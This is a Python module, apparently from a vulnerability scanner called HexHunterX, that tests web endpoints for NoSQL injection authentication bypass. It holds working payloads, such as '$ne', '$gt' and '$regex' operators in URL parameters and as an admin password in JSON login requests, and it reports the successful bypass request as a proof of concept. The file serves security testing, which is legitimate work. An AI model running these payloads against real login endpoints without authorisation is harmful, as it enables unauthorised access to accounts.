"""
HexHunterX -- NoSQL Injection Detection Module (v2).

- No parameter invention
- Strict bypass verification (requires 401/403 -> 200/302 flip)
- Requires multiple success keywords to eliminate size-diff FPs
- JSON blind testing ONLY on endpoints that accept JSON
"""

import json
from urllib.parse import urlencode, urlparse, parse_qs
import re

from utils.logger import HexHunterXLogger
from utils.network import AsyncHTTPClient
from modules.fuzzing.payloads import PayloadEngine
from modules.vulns.verification import ConfidenceScorer, Confidence

logger = HexHunterXLogger.get_logger("vulns.nosqli")

NOSQL_PAYLOADS = {
    "url": [
        "[$ne]=1", "[$gt]=1", "[$regex]=.*", "[$exists]=true",
    ],
    "json": [
        {"$ne": 1}, {"$gt": 1}, {"$regex": ".*"}, {"$exists": True},
    ]
}

SUCCESS_KEYWORDS = [
    "welcome", "dashboard", "logged in", "success", "admin",
    "profile", "account", "settings", "logout", "user"
]


class NoSQLiDetector:
    """Detect NoSQL injection vulnerabilities."""

    def __init__(self, http_client: AsyncHTTPClient, oob_client=None):
        self.http = http_client
        self.oob = oob_client
        self._scorer = ConfidenceScorer()

    async def detect(self, url: str) -> list[dict]:
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if params:
            findings.extend(await self._test_url_params(base, params))

        # We only test JSON if we have a way to know it accepts JSON.
        # But for now, we'll just test if the endpoint ends in /login or /auth
        # to avoid spamming every endpoint with JSON POSTs.
        if "/login" in base.lower() or "/auth" in base.lower() or "/api" in base.lower():
            findings.extend(await self._test_json_body(base))

        return findings

    async def _test_url_params(self, base, params):
        findings = []
        # Get baseline
        bp = {k: v[0] for k, v in params.items()}
        baseline = await self.http.get(f"{base}?{urlencode(bp)}")
        if baseline.error:
            return findings

        # If baseline is already successful, bypass testing is unreliable
        if baseline.status_code in (200, 301, 302):
            return findings

        for param in params:
            orig = params[param][0]
            for payload in NOSQL_PAYLOADS["url"]:
                # Construct like: ?username[$ne]=1
                test_url = f"{base}?{param}{payload}&" + urlencode(
                    {k: v for k, v in bp.items() if k != param}
                )

                resp = await self.http.get(test_url)
                if resp.error:
                    continue

                if self._is_bypass(baseline, resp):
                    # Verify
                    resp2 = await self.http.get(test_url)
                    confirmed = not resp2.error and self._is_bypass(baseline, resp2)

                    signals = {
                        "status_code_flip": True,
                        "auth_bypass": True,
                        "retry_confirmed": confirmed,
                    }
                    conf = self._scorer.score(signals)
                    if not Confidence.meets_threshold(conf, Confidence.MEDIUM):
                        continue

                    poc = f"{test_url}"
                    findings.append({
                        "type": "NoSQL Injection (Auth Bypass)",
                        "severity": "critical" if confirmed else "high",
                        "title": f"NoSQLi Auth Bypass in parameter '{param}'",
                        "description": (
                            f"Injecting NoSQL operator '{payload}' bypassed authentication. "
                            f"Status changed from {baseline.status_code} to {resp.status_code}."
                        ),
                        "evidence": (
                            f"[1] WHERE TESTED: {base}\n"
                            f"[2] HOW TESTED: Injected NoSQL operator into URL parameter '{param}' and observed authentication bypass.\n"
                            f"[3] PAYLOAD USED: {param}{payload}\n"
                            f"[4] VERIFICATION OUTPUT: Status changed from {baseline.status_code} to {resp.status_code}. Retry Confirmed: {confirmed}"
                        ),
                        "request": test_url,
                        "response": resp.body[:1000],
                        "reproduction": poc,
                        "confidence": conf,
                        "verification_method": "auth_bypass_verification",
                    })
                    break
        return findings

    async def _test_json_body(self, base):
        findings = []
        # Test common auth endpoints with JSON
        dummy_data = {"username": "admin", "password": "wrongpassword"}
        baseline = await self.http.post(base, json=dummy_data)
        if baseline.error or baseline.status_code in (200, 301, 302):
            return findings

        for payload in NOSQL_PAYLOADS["json"]:
            test_data = {"username": "admin", "password": payload}
            resp = await self.http.post(base, json=test_data)
            if resp.error:
                continue

            if self._is_bypass(baseline, resp):
                resp2 = await self.http.post(base, json=test_data)
                confirmed = not resp2.error and self._is_bypass(baseline, resp2)

                signals = {
                    "status_code_flip": True,
                    "auth_bypass": True,
                    "retry_confirmed": confirmed,
                }
                conf = self._scorer.score(signals)

                findings.append({
                    "type": "NoSQL Injection (JSON Auth Bypass)",
                    "severity": "critical" if confirmed else "high",
                    "title": f"NoSQLi JSON Auth Bypass",
                    "description": (
                        f"Injecting JSON NoSQL operator bypassed authentication. "
                        f"Status changed from {baseline.status_code} to {resp.status_code}."
                    ),
                    "evidence": (
                        f"[1] WHERE TESTED: {base}\n"
                        f"[2] HOW TESTED: Injected NoSQL operator into JSON body parameter 'password' and observed authentication bypass.\n"
                        f"[3] PAYLOAD USED: {json.dumps(test_data)}\n"
                        f"[4] VERIFICATION OUTPUT: Status changed from {baseline.status_code} to {resp.status_code}. Retry Confirmed: {confirmed}"
                    ),
                    "request": f"POST {base}\nContent-Type: application/json\n\n{json.dumps(test_data)}",
                    "response": resp.body[:1000],
                    "confidence": conf,
                    "verification_method": "json_auth_bypass_verification",
                })
                break

        return findings

    def _is_bypass(self, baseline, resp):
        # Strict bypass requires status code flip from failure to success
        if baseline.status_code in (401, 403, 404, 500):
            if resp.status_code in (200, 301, 302):
                # Ensure it actually looks like a success page
                body_lower = resp.body.lower()
                hits = sum(1 for kw in SUCCESS_KEYWORDS if kw in body_lower)
                if hits >= 2 or resp.status_code in (301, 302):
                    return True
        return False
